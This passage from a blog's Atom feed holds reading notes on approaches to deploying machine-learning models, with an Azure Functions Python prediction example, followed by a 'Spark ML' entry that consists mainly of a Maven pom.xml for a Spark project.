class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> azure.functions <span class="keyword">as</span> func</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.externals <span class="keyword">import</span> joblib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(req: func.HttpRequest)</span> -&gt; func.HttpResponse:</span></span><br><span class="line">    logging.info(<span class="string">'Python HTTP trigger function processed a request.'</span>)</span><br><span class="line">    <span class="keyword">if</span> req.body:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.info(<span class="string">"Converting Request to DataFrame"</span>)</span><br><span class="line">            req_body = req.get_json()</span><br><span class="line">            df_body  = pd.DataFrame([req_body])</span><br><span class="line"></span><br><span class="line">            logging.info(<span class="string">"Loadding the Prediction Model"</span>)</span><br><span class="line">            filename = <span class="string">"model.pckl"</span></span><br><span class="line">            loaded_model = joblib.load(filename)</span><br><span class="line">            <span class="comment"># Features names need to have been added to the pickled model</span></span><br><span class="line">            feature_names = loaded_model.feature_names</span><br><span class="line">            <span class="comment"># subselect only the feature names </span></span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Subselecting the dataframe"</span>)</span><br><span class="line">            df_subselect = df_body[feature_names]</span><br><span class="line">            </span><br><span class="line">            logging.info(<span class="string">"Predicting the Probability"</span>)</span><br><span class="line">            result = loaded_model.predict_proba(df_subselect)</span><br><span class="line">            <span class="comment"># We are looking at the probba prediction for class 1</span></span><br><span class="line">            prediction = result[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> func.HttpResponse(<span class="string">"&#123;prediction&#125;"</span>.format(prediction=prediction), status_code=<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> func.HttpResponse(</span><br><span class="line">             <span class="string">"Please pass a name on the query string or in the request body"</span>,</span><br><span class="line">             status_code=<span class="number">400</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><em>Container</em></p><p>An alternative to functions, is to deploy a flask or django application through a docker container (Amazon ECS, Azure Container Instance or Google Kubernetes Engine). Azure for instance provides an easy way to setup prediction containers through its’ <a href="https://docs.microsoft.com/en-us/azure/machine-learning/service/how-to-deploy-and-where" target="_blank" rel="noopener">Azure Machine Learning service</a>.</p><p><em>Notebooks</em></p><p>Different notebooks providers such as <a href="https://docs.databricks.com/applications/mlflow/models.html" target="_blank" rel="noopener">databricks</a> and <a href="https://www.dataiku.com/dss/features/model-deployment/" target="_blank" rel="noopener">dataiku</a> have notably worked on simplifying the model deployment from their environments. These have the feature of setting up a webservice to a local environment or deploying to external systems such as Azure ML Service, Kubernetes engine etc…</p><h4 id="in-App"><a href="#in-App" class="headerlink" title="in App"></a>in App</h4><p>In certain situations when there are legal or privacy requirements that do not allow for data to be stored outside of an application, or there exists constraints such as having to upload a large amount of files, leveraging a model within the application tend to be the right approach.</p><p>Android-ML Kit or the likes of Caffe2 allows to leverage models within native applications, while <a href="https://www.tensorflow.org/js" target="_blank" rel="noopener">Tensorflow.js</a> and <a href="https://github.com/Microsoft/onnxjs" target="_blank" rel="noopener">ONNXJS</a> allow for running models directly in the browser or in apps leveraging javascripts.</p><h3 id="Considerations"><a href="#Considerations" class="headerlink" title="Considerations"></a>Considerations</h3><p>Beside the method of deployments of the models, they are quite a few important considerations to have when deploying to production.</p><p><strong>Model Complexity</strong></p><p>The complexity of the model itself, is the first considerations to have. Models such as a linear regressions and logistic regression are fairly easy to apply and do not usually take much space to store. Using more complex model such as a neural network or complex ensemble decision tree, will end up taking more time to compute, more time to load into memory on cold start and will prove more expensive to run</p><p><strong>Data Sources</strong></p><p>It is important to consider the difference that could occur between the datasource in productions and the one used for training. While it is important for the data used for the training to be in sync with the context it would be used for in production, it is often impractical to recalculate every value so that it becomes perfectly in-sync.</p><p><strong>Experimentation framework</strong></p><p>Setting up an experimentation framework, A/B testing the performance of different models versus objective metrics. And ensuring that there is sufficient tracking to accurately debug and evaluate models performance a posteriori.</p><h3 id="Wrapping-Up"><a href="#Wrapping-Up" class="headerlink" title="Wrapping Up"></a>Wrapping Up</h3><p>Choosing how to deploy a predictive models into production is quite a complex affair, there are different way to handle the lifecycle management of the predictive models, different formats to stores them, multiple ways to deploy them and very vast technical landscape to pick from.</p><p>Understanding specific use cases, the team’s technical and analytics maturity, the overall organization structure and its’ interactions, help come to the the right approach for deploying predictive models to production.</p><hr><p>More from me on <a href="https://medium.com/analytics-and-data" target="_blank" rel="noopener">Hacking Analytics</a>:</p><ul><li><a href="https://medium.com/analytics-and-data/on-the-evolution-of-data-engineering-c5e56d273e37" target="_blank" rel="noopener">One the evolution of Data Engineering</a></li><li><a href="https://medium.com/analytics-and-data/airflow-the-easy-way-f1c26859ee21" target="_blank" rel="noopener">Airflow, the easy way</a></li><li><a href="https://medium.com/analytics-and-data/e-commerce-analysis-data-structures-and-applications-6420c4fa65e7" target="_blank" rel="noopener">E-commerce Analysis: Data-Structures and Applications</a></li><li><a href="https://medium.com/analytics-and-data/setting-up-airflow-on-azure-connecting-to-ms-sql-server-8c06784a7e2b" target="_blank" rel="noopener">Setting up Airflow on Azure &amp; connecting to MS SQL Server</a></li><li><a href="https://medium.com/analytics-and-data/3-simple-rules-to-build-machine-learning-models-that-add-value-61106db88461" target="_blank" rel="noopener">3 simple rules to build machine learning Models that add value</a></li></ul><blockquote><p>简单看了下，没有深入纠结，本文主要从离线和实时两个方面介绍了ML的应用，给了一些简单的例子。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文 &lt;a href=&quot;https://medium.com/analytics-and-data/overview-of-the-different-approaches-to-putting-machinelearning-ml-models-in-production-c699b34abf86&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;overview of the different approaches to putting machine learning (ml) models in production&gt;&lt;/overview&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2gy1g37wmih501j20m80fwmzi.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/categories/Reading-notes/Mechine-Learning/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>Spark ML</title>
    <link href="http://yoursite.com/2020/03/09/SparkML/"/>
    <id>http://yoursite.com/2020/03/09/SparkML/</id>
    <published>2020-03-09T10:03:39.674Z</published>
    <updated>2019-05-23T08:06:42.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>SparkML也是个大坑，先在这里贴上pom文件</p></blockquote><a id="more"></a> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SparkML<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>Akka repository<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo.akka.io/releases<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/scala/<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span>&gt;</span>src/test/scala/<span class="tag">&lt;/<span class="name">testSourceDirectory</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.scala-tools<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-scala-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>testCompile<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">scalaVersion</span>&gt;</span>2.11.4<span class="tag">&lt;/<span class="name">scalaVersion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.SF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.DSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/*.RSA<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">transformers</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.AppendingTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">resource</span>&gt;</span>reference.conf<span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;<span class="name">transformer</span></span></span><br><span class="line"><span class="tag">                                        <span class="attr">implementation</span>=<span class="string">"org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">Main-Class</span>&gt;</span><span class="tag">&lt;/<span class="name">Main-Class</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">transformer</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">transformers</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-core_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-hive_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-streaming_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-sql_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-exec<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hive<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hive-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>redis.clients<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jedis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">type</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>compile<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-client&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">        &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.hbase&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;hbase-common&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;1.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.37<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--&lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;0.8.2.2&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- &lt;dependency&gt;</span></span><br><span class="line"><span class="comment">            &lt;groupId&gt;org.apache.spark&lt;/groupId&gt;</span></span><br><span class="line"><span class="comment">            &lt;artifactId&gt;spark-streaming-kafka_2.11&lt;/artifactId&gt;</span></span><br><span class="line"><span class="comment">            &lt;version&gt;2.2.1&lt;/version&gt;</span></span><br><span class="line"><span class="comment">        &lt;/dependency&gt; --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.spark<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spark-mllib_2.11<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;SparkML也是个大坑，先在这里贴上pom文件&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Reading notes" scheme="http://yoursite.com/categories/Reading-notes/"/>
    
      <category term="Spark机器学习案例实战" scheme="http://yoursite.com/categories/Reading-notes/Spark%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/"/>
    
    
      <category term="Reading notes" scheme="http://yoursite.com/tags/Reading-notes/"/>
    
      <category term="Mechine Learning" scheme="http://yoursite.com/tags/Mechine-Learning/"/>
    
  </entry>
  
  <entry>
    <title>SQL积累</title>
    <link href="http://yoursite.com/2020/03/09/SQL/"/>
    <id>http://yoursite.com/2020/03/09/SQL/</id>
    <published>2020-03-09T10:03:39.532Z</published>
    <updated>2019-06-12T08:50:43.000Z</updated>
    
